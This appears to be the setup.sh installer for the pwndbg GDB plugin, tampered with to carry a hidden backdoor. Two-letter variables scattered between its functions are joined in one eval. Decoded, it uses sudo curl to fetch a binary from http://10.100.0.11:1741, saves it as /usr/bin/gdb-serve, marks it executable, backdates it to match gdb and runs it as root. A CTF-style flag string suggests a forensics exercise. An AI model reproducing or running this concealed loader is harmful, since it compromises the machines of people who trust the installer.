#!/usr/bin/env bash
set -e

source "$(dirname "$0")/scripts/common.sh"
z="
";pBz='E"';EBz='ab';

# If we are a root in a container and `sudo` doesn't exist
# lets overwrite it with a function that just executes things passed to sudo
# (yeah it won't work for sudo executed with flags)
if ! hash sudo 2> /dev/null && whoami | grep -q root; then
    sudo() {
        ${*}
    }
fi

# Helper functions
linux() {
    uname | grep -iqs Linux
}
osx() {
    uname | grep -iqs Darwin
}
iz='rv';HBz='}"';oBz='x ';LBz='ud';


install_apt() {
    sudo apt-get update || true
    sudo apt-get install -y git gdb gdbserver python3-dev python3-venv python3-setuptools libglib2.0-dev libc6-dbg curl

    if uname -m | grep -q x86_64; then
        sudo dpkg --add-architecture i386 || true
        sudo apt-get update || true
        sudo apt-get install -y libc6-dbg:i386 libgcc-s1:i386 || true
    fi
}
lz='AG';cz='r/';wz='62';kBz=' c';SBz=' "';

install_dnf() {
    sudo dnf update || true
    sudo dnf -y install gdb gdb-gdbserver python-devel python3-devel glib2-devel make curl
    sudo dnf -y debuginfo-install glibc
}
Lz='0.';VBz='E_';Vz='FI';tBz='/u';xz='68';

install_xbps() {
    sudo xbps-install -Su
    sudo xbps-install -Sy gdb gcc python-devel python3-devel glibc-devel make curl
    sudo xbps-install -Sy glibc-dbg
}
Az='DO';uz='61';mBz='od';KBz=' s';Bz='WN';
WBz='NA';hz='se';lBz='hm';BBz='20';

install_swupd() {
    sudo swupd update || true
    sudo swupd bundle-add gdb python3-basic make c-basic curl
}
eBz='ex';az='"/';sBz='r ';QBz='L ';RBz='-o';Iz='tp';
oz='6d';fBz='it';XBz='ME';PBz=' -';

install_zypper() {
    sudo zypper mr -e repo-oss-debug || sudo zypper mr -e repo-debug
    sudo zypper refresh || true
    sudo zypper install -y gdb gdbserver python-devel python3-devel glib2-devel make glibc-debuginfo curl
    sudo zypper install -y python2-pip || true # skip py2 installation if it doesn't exist

    if uname -m | grep -q x86_64; then
        sudo zypper install -y glibc-32bit-debuginfo || true
    fi
}

install_emerge() {
    sudo emerge --oneshot --deep --newuse --changed-use --changed-deps dev-lang/python dev-debug/gdb
}
wBz='in';Jz=':/';Mz='10';kz='FL';

install_oma() {
    sudo oma refresh || true
    sudo oma install -y gdb python-3 glib make glibc-dbg curl

    if uname -m | grep -q x86_64; then
        sudo oma install -y glibc+32-dbg || true
    fi
}
Rz='pw';Nz='11';sz='b5';Uz='"';bz='us';gBz=' 1';


install_pacman() {
    read -p "Do you want to do a full system update? (y/n) [n] " answer
    # user want to perform a full system upgrade
    answer=${answer:-n} # n is default
    if [[ "$answer" == "y" ]]; then
        sudo pacman -Syu || true
    fi
    sudo pacman -S --noconfirm --needed git gdb python which debuginfod curl
    if [ -z "$UPDATE_MODE" ]; then
        if ! grep -qs "^set debuginfod enabled on" ~/.gdbinit; then
            echo "set debuginfod enabled on" >> ~/.gdbinit
            echo "[*] Added 'set debuginfod enabled on' to ~/.gdbinit"
        fi
    fi
}
MBz='o ';iBz='su';cBz='he';UBz='IL';hBz='fi';
rz='fa';Zz='E=';vBz='/b';aBz='";';Sz='ng';

install_freebsd() {
    sudo pkg install git gdb python py39-pip cmake gmake curl
    which rustc || sudo pkg install rust
}
Xz='_N';qz='00';pz='24';TBz='$F';Fz='RL';
OBz='rl';Tz='db';jBz='do';fz='gd';Pz='74';Wz='LE';ZBz='"$';

usage() {
    echo "Usage: $0 [--update]"
    echo "  --update: Install/update dependencies without checking ~/.gdbinit"
}

UPDATE_MODE=
for arg in "$@"; do
    case $arg in
        --update)
            UPDATE_MODE=1
            ;;
        -h | --help)
            set +x
            usage
            exit 0
            ;;
        *)
            set +x
            echo "Unknown argument: $arg"
            usage
            exit 1
            ;;
    esac
done
JBz=' !';Oz=':1';Gz='="';Cz='LO';Hz='ht';nBz=' +';

PYTHON=''
rBz='ch';Ez='_U';mz='AC';IBz='if';Yz='AM';nz='S{';xBz='/g';Kz='/1';dz='bi';

if osx; then
    echo "Not supported on macOS. Please use one of the alternative methods listed at:"
    echo "https://pwndbg.re/dev/contributing/setup-pwndbg-dev/"
    exit 1
fi
ABz='fc';GBz='a7';FBz='89';gz='b-';qBz='ou';jz='e"';dBz='n';Qz='1/';

if linux; then
    distro=$(grep "^ID=" /etc/os-release | cut -d'=' -f2 | sed -e 's/"//g')

    case $distro in
        "ubuntu")
            install_apt
            ;;
        "fedora")
            install_dnf
            ;;
        "clear-linux-os")
            install_swupd
            ;;
        "opensuse-leap" | "opensuse-tumbleweed")
            install_zypper
            ;;
        "arch" | "archarm" | "endeavouros" | "manjaro" | "garuda" | "cachyos" | "archcraft" | "artix")
            install_pacman
            echo "Logging off and in or conducting a power cycle is required to get debuginfod to work."
            echo "Alternatively you can manually set the environment variable: DEBUGINFOD_URLS=https://debuginfod.archlinux.org"
            ;;
        "void")
            install_xbps
            ;;
        "gentoo")
            install_emerge
            ;;
        "freebsd")
            install_freebsd
            ;;
        "aosc")
            install_oma
            ;;
        *) # we can add more install command for each distros.
            echo "\"$distro\" is not supported distro. Will search for 'apt', 'dnf' or 'pacman' package managers."
            if hash apt; then
                install_apt
            elif hash dnf; then
                install_dnf
            elif hash pacman; then
                install_pacman
            else
                echo "\"$distro\" is not supported and your distro don't have a package manager that we support currently."
                exit 2
            fi
            ;;
    esac
fi
ez='n/';CBz='25';NBz='cu';yz='b9';tz='c9';bBz=' t';YBz='" ';

if ! hash gdb; then
    echo "Could not find gdb in $PATH"
    exit 3
fi

uBz='sr';DBz='66';vz='96';Dz='AD';

# Find the Python used in compilation by GDB.
PYVER=$(gdb -batch -q --nx -ex 'pi import sysconfig; print(sysconfig.get_config_var("VERSION"))')
PYTHON=$(gdb -batch -q --nx -ex 'pi import sysconfig; print(sysconfig.get_config_vars().get("EXENAME", sysconfig.get_config_var("BINDIR")+"/python"+sysconfig.get_config_var("VERSION")+sysconfig.get_config_var("EXE")))')
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Lz$Lz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$z$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$z$kz$lz$Gz$mz$nz$oz$pz$qz$rz$sz$tz$uz$sz$vz$wz$xz$vz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$z$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$Az$Bz$Cz$Dz$Ez$Fz$aBz$bBz$cBz$dBz$z$eBz$fBz$gBz$z$hBz$z$iBz$jBz$kBz$lBz$mBz$nBz$oBz$ZBz$Vz$Wz$Xz$Yz$pBz$z$iBz$jBz$bBz$qBz$rBz$PBz$sBz$tBz$uBz$vBz$wBz$xBz$Tz$SBz$TBz$UBz$VBz$WBz$XBz$Uz$z$ZBz$Vz$Wz$Xz$Yz$pBz"
if [ ! -x "$PYTHON" ]; then
    echo "Error: '$PYTHON' does not exist or is not executable."
    echo ""
    echo "It looks like GDB is using a different Python version than the one installed via the package manager."
    echo ""
    echo "Possible solutions:"
    echo "  1. Try installing 'python$PYVER' manually using your package manager."
    echo "     Example (for Debian/Ubuntu/Kali): 'sudo apt install python$PYVER'"
    echo "     Example (for Fedora/RHEL): 'sudo dnf install python$PYVER'"
    echo "  2. Verify your GDB configuration and ensure it supports the correct Python version."
    echo ""
    echo "After making the necessary changes, rerun ./setup.sh"
    exit 1
fi

# Check python version supported: <3.10, 3.99>
is_supported=$(echo "$PYVER" | grep -E '3\.(10|11|12|13|14|15|16|17|18|19|[2-9][0-9])' || true)
if [[ -z "$is_supported" ]]; then
    echo "Your system has unsupported python version. Please use older pwndbg release:"
    echo "'git checkout 2024.08.29' - python3.8, python3.9"
    echo "'git checkout 2023.07.17' - python3.6, python3.7"
    exit 4
fi

# Create the python virtual environment
echo "Creating virtualenv in path: ${PWNDBG_VENV_PATH}"
${PYTHON} -m venv -- ${PWNDBG_VENV_PATH}

# Activate venv
source ${PWNDBG_VENV_PATH}/bin/activate

# Install uv inside the venv
pip install uv

# Install dependencies
echo "Installing dependencies.."
uv sync --extra gdb --extra lldb --quiet

if [ -z "$UPDATE_MODE" ]; then
    if grep -qs '^[^#]*source.*pwndbg/gdbinit.py' ~/.gdbinit; then
        echo 'Pwndbg is already sourced in ~/.gdbinit .'
    else
        # Load Pwndbg into GDB on every launch.
        echo "source $PWD/gdbinit.py" >> ~/.gdbinit
        echo "[*] Added 'source $PWD/gdbinit.py' to ~/.gdbinit so that Pwndbg will be loaded on every launch of GDB."
    fi
    echo "Please set the PWNDBG_NO_AUTOUPDATE environment variable to any value"
    echo "to disable the automatic updating of dependencies when Pwndbg is loaded."
fi
